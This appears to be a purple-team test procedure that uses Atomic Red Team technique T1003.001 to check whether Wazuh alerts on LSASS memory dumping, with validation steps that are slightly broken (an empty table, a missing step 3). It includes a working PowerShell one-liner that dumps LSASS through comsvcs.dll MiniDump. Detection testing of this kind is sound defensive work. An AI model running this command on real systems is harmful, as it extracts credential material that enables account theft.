# Atomic Test: T1003.001 — OS Credential Dumping: LSASS Memory

## Test Procedure

**Atomic Red Team Technique:** T1003.001
**Platform:** Windows
**Requires Admin:** Yes

### Manual Execution (if not using the PowerShell runner)

```powershell
# Test 1: Dump LSASS via comsvcs.dll MiniDump (no external tools needed)
$procID = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $procID C:\Windows\Temp\lsass-test.dmp full
```

### Using Invoke-AtomicRedTeam

```powershell
Invoke-AtomicTest T1003.001
```

| Field | Value |

## Validation Steps

1. Run the test command above on the Windows endpoint
2. Within 5-10 seconds, check the Wazuh dashboard for a new alert

4. Note the timestamp delta between command execution and alert appearance — record this in your results log
